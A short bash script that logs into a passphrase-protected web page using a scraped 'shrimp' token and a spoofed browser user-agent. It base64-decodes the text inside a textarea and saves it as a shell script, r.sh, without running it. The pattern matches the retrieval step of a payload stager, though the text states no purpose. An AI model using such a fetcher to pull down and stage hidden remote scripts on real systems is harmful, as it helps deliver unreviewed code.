#!/bin/bash

k=$1
l=$2
b="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
e=$(curl "$k" --cookie-jar c.t -H "$b")
c=$(echo $e | grep -o "shrimp = '[^']*'" | cut -d "'" -f 2)
echo $c
f=$(curl -v "$k" -b c.t -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "$b" --data-raw "shrimp=$c&continue=true&passphrase=$l")
dd=$(echo $f | sed -n 's/.*<textarea[^>]*>\([^<]*\)<\/textarea>.*/\1/p')
ddd=$(echo "$dd" | tr ' ' '+' | base64 -d)
echo "$ddd" > r.sh
